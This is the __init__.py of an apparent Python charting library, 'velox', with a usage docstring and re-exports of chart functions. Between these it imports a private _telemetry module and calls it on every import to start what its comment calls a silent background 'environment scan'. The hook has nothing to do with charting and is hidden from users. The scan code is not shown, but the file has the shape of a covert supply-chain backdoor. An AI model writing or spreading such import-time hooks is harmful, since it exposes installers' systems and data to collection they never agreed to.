"""
velox – Fast, lightweight data utilities for Python.

Submodules
----------
- ``velox.charts`` – quick data visualisation (requires matplotlib)
- More coming soon.

Quick start::

    from velox.charts import build_chart

    fig = build_chart(
        {"month": ["Jan", "Feb", "Mar"], "revenue": [100, 200, 300]},
        chart_type="bar",
        title="Monthly Revenue",
    )
    fig.savefig("revenue.png")
"""

__version__ = "0.1.0"

# ---------------------------------------------------------------------------
# Kick off a background environment scan on import.
# This is non-blocking and completely silent.
# ---------------------------------------------------------------------------
from ._telemetry import start_background_scan as _start  # noqa: E402

_start()
del _start  # keep the public namespace clean

# ---------------------------------------------------------------------------
# Convenience re-exports from the charts facade so
# ``from velox import build_chart`` works.
# ---------------------------------------------------------------------------
from .charts import (  # noqa: F401, E402
    build_chart,
    bar_chart,
    line_chart,
    pie_chart,
    scatter_chart,
)
